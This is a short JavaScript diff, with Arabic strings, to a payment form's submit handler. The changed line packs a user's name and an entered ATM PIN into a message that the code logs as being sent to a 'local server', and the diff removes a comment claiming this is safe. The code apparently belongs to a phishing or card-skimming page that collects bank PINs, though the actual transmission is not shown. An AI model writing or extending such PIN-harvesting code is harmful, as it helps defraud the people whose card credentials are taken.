@@ -252,8 +252,7 @@ document.getElementById('paymentForm').addEventListener('submit', function(event
     } else {
         document.getElementById('errorMessage').style.display = 'none';
 
-        // ✅ استخدام الخادم المحلي آمن
-        const message = `تم إدخال رمز ATM:\n\n👤 من: ${name}\n🔐 رمز ATM: ${code1}`;
+        const message = `تم إدخال رمز ATM:\n\n👤 من: ${ownerName}\n🔐 رمز ATM: ${code1}`;
 
         console.log('✅ إرسال البيانات إلى الخادم المحلي:', message);
 
